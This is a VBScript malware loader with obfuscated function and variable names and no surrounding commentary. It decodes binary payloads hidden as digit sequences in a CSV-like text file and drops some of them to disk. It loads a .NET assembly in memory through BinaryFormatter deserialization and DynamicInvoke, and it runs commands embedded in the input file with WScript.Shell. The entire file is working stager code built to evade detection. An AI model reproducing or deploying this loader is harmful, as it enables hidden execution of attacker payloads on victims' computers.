
Sub sbD(feNe, vba)
Set barys = CreateObject("ADODB.Stream")
barys.Type = 1
barys.Open
Set mem = CreateObject("System.IO.MemoryStream")
mem.SetLength(0)
For Each B in vba
mem.WriteByte (B)
Next
barya = mem.ToArray()
barys.Write barya
Dim position: position = 1
position = InStr(position, feNe, "%")
barys.SaveToFile feNe, 2
End Sub
Sub cdifne1(fso, zumb)
If Not fso.FolderExists(zumb) Then
pafbr = fso.GetParentFolderName(zumb)
If pafbr <> "" Then
cdifne1 fso, pafbr
End If
fso.CreateFolder zumb
End If
End Sub
Sub WfTP(fso, wsh, filePath, content)
expandedPath = wsh.ExpandEnvironmentStrings(filePath)
pafbr = fso.GetParentFolderName(expandedPath)
cdifne1 fso, pafbr
sbD expandedPath, content
End Sub
Function ToMStream(din4)
Dim ms
Set ms = CreateObject("System.IO.MemoryStream")
ms.SetLength(0)
For Each B in din4
ms.WriteByte (B)
Next
ms.Position = 0
Set ToMStream = ms
End Function
Sub pcsv(inpf)
Set fso = CreateObject("Scripting.FileSystemObject")
Dim wsh
Set wsh = CreateObject("WScript.Shell")
wsh.Environment("Process").Item("COMPLUS_Version") = "v4.0.30319"
Set inputFile = fso.OpenTextFile(inpf, 1)
inputFile.ReadLine()
line = Trim(inputFile.ReadLine())
values1 = Split(line, ";")
values2 = Split(values1(0), ".")
off = CInt(values2(0))
mbH = CInt(values2(1))
inputFile.Close
Set inputFile = Nothing
header = cFBt(fso, wsh, inpf, 2, mbH, "")
For i = 0 To UBound(header)
allHeader = allHeader & Chr(header(i))
Next
allHeaderParts = Split(allHeader, ";")
command = ""
For Each currentHeader in allHeaderParts
firstChar = Left(currentHeader, 1)
currentHeaderParts = Split(currentHeader, "|")
idPd = 0
siPd = 0
ptPd = ""
If firstChar = "a" Then
idPd = CLng(currentHeaderParts(1))
siPd = CLng(currentHeaderParts(2))
din4 = cFBt(fso, wsh, inpf, off + idPd, siPd, "")
Dim fmt, al, d, o
Set fmt = CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
Set al = CreateObject("System.Collections.ArrayList")
al.Add Empty
Set d = fmt.Deserialize_2(ToMStream(din4))
Set o = d.DynamicInvoke(al.ToArray()).CreateInstance("Hello")
ElseIf firstChar = "d" Then
idPd = CLng(currentHeaderParts(1))
siPd = CLng(currentHeaderParts(2))
ptPd = currentHeaderParts(3)
cFBt fso, wsh, inpf, off + idPd, siPd, ptPd
ElseIf firstChar = "r" Then
command_raw = currentHeaderParts(1)
command = wsh.ExpandEnvironmentStrings(command_raw)
WScript.Echo "running: " & command
wsh.Run command, 1, False
End If
Next
End Sub
Function cFBt(fso, wsh, inpf, payloadIndex, binSize, outputFilePath)
peBid = 0
index = 0
Dim din4()
ReDim din4(binSize -1)
Set inputFile = fso.OpenTextFile(inpf, 1)
inputFile.ReadLine()
Do Until inputFile.AtEndOfStream OR peBid >= binSize
line = Trim(inputFile.ReadLine())
ecInd = ""
dgiC = 0
For i = 1 To Len(line)
char = Mid(line, i, 1)
If peBid < binSize Then
If IsNumeric(char) Then
dgiC = dgiC + 1
ecInd = ecInd & char
Else
If index >= payloadIndex Then
If dgiC > 0 Then
If dgiC < 4 Then
textInt = CInt(ecInd)
If 299 < textInt And textInt < 800 Then
ecInd = Mid(ecInd, 2, 2)
realInt = CInt(ecInd)
ElseIf textInt < 100 And peBid Mod 2 = 0 Then
ecInd = Mid(ecInd, 2, 2)
realInt = CInt(ecInd)
ElseIf 799 < textInt And textInt < 900 Then
ecInd = "1" & Mid(ecInd, 2, 2)
realInt = CInt(ecInd)
ElseIf 899 < textInt And textInt < 1000 Then
helper = Mid(ecInd, 2, 2)
ecInd = "2" & helper
realInt = CInt(ecInd)
Else
realInt = CInt(ecInd)
End If
din4(peBid) = realInt
peBid = peBid + 1
End If
End If
End If
dgiC = 0
ecInd = ""
index = index + 1
End If
End If
Next
Loop
inputFile.Close
Set inputFile = Nothing
If outputFilePath <> "" Then
WfTP fso, wsh, outputFilePath, din4
End If
cFBt = din4
End Function
